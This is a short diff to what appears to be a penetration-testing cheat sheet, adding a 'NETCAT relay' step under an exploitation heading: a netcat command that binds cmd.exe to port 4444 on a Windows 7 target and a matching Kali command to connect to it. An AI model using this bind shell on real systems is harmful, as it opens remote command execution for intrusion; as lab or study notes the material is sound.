@@ -190,6 +190,13 @@ From Windows 7 (redirector):
 
 5 - EXPLOITATION ON TARGET:________________________________________________________________________________________________________
 	
+	- NETCAT relay (for Windows7):
+		From Windows7 --
+			#> nc -l -p 4444 -e cmd.exe
+		
+		From Kali --
+			#> nc <windows7-IP> 4444 
+	
 	- *See Meterpreter cheat sheet*	
 
 	- make sure you're on the right box
